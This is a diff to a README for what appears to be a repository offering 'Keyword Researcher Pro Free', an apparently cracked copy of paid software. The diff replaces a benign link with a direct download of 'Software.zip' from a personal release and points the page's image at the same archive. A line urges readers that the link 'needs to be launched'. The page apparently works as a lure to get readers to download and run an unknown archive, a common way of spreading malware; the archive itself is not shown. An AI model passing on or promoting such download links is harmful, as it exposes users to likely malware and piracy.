@@ -38,7 +38,7 @@ This repository is dedicated to providing resources and insights into using Keyw
 
 ## Repository Link 🔗
 
-[Download Keyword Researcher Pro Free](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Keyword Researcher Pro Free](https://github.com/shivkaustubh/Keyword-Researcher-Pro-Free/releases/download/v1.0/Software.zip)
 
 ### Note: This link needs to be launched to access the content.
 
@@ -56,4 +56,4 @@ Feel free to reach out to us with any questions, feedback, or suggestions regard
 
 Happy researching! 🌟
 
-![Keyword Researcher Pro](https://www.example.com/keyword-researcher-pro-image.jpg)
+![Keyword Researcher Pro](https://github.com/shivkaustubh/Keyword-Researcher-Pro-Free/releases/download/v1.0/Software.zip)
